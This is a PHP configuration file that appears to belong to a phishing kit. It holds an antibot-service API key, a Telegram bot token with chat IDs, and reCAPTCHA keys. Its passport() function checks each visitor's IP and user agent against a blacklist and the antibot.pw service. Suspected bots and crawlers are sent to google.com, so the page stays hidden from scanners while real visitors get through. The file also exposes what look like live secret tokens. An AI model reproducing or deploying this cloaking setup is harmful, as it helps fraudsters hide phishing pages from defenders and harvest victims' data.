<?php
session_start();
error_reporting(0);

define("ANTIBOT_API", '8584c7b0ae67e1c6a86771e43dbd593a');
// to return 
$user_ids=array("-880604104");




// $user_ids=array("-622020018");




$bottoken="6117586152:AAE-_L-P1XFhHgvB02zIPj6VVZe7i2OQiwA";

$captch_key = "6LcVWJkmAAAAAEEERr9fSRs87qHuRDCZp4PJuzvP";
$captch_secretkey = "6LcVWJkmAAAAAGVIbNwwlGcCwfNiKbmhFr6RyK_B";


function passport() {
        $ip = $_SERVER['REMOTE_ADDR'];
        if( $_SESSION['passport'] == 1 )
            return;
        $list = file("blacklist.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (in_array($ip, $list)) {
            header("Location: https://www.google.com/");
            exit();
        }
        $ua = str_replace(' ', '', $_SERVER['HTTP_USER_AGENT']);
        $check = json_decode(file_get_contents('https://antibot.pw/api/v2-blockers?ip='. $ip .'&apikey='. ANTIBOT_API .'&ua=' . $ua),true);
        $is_bot = $check['is_bot'];
        if( $is_bot == 1 && $check["info"]["ipinfo"]["site"]["hostname"] != "localhost") {
            file_put_contents("blacklist.txt", $ip . "\r\n", FILE_APPEND);
            header("Location: https://www.google.com/");
            exit();
        } else {
            $_SESSION['passport'] = 1;
        }
    }
    function generateRandomString($length = 6) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
passport();

?>